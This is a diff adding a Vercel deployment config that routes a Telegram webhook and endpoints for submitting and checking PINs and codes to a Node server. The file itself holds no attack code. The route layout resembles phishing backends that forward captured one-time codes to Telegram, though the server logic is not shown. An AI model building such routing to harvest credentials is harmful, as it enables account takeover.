@@ -1,0 +1,15 @@
+{
+  "version": 2,
+  "builds": [
+    { "src": "server.js", "use": "@vercel/node" },
+    { "src": "public/**/*", "use": "@vercel/static" }
+  ],
+  "routes": [
+    { "src": "/telegram-webhook", "dest": "server.js" },
+    { "src": "/submit-pin", "dest": "server.js" },
+    { "src": "/check-pin/(.*)", "dest": "server.js" },
+    { "src": "/submit-code", "dest": "server.js" },
+    { "src": "/check-code/(.*)", "dest": "server.js" },
+    { "src": "/(.*)", "dest": "/public/$1" }
+  ]
+}
